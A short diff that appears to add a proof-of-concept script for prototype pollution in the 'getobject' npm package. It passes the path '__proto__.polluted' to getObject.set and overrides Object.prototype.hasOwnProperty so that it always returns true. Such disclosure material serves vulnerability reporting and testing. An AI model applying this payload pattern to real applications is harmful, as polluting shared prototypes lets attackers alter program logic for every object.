@@ -1,0 +1,6 @@
+Object.prototype.hasOwnProperty = () => true;
+console.log({}.polluted);
+const getObject = require('getobject');
+var obj = {};
+getObject.set(obj, '__proto__.polluted', 'yes');
+console.log({}.polluted);
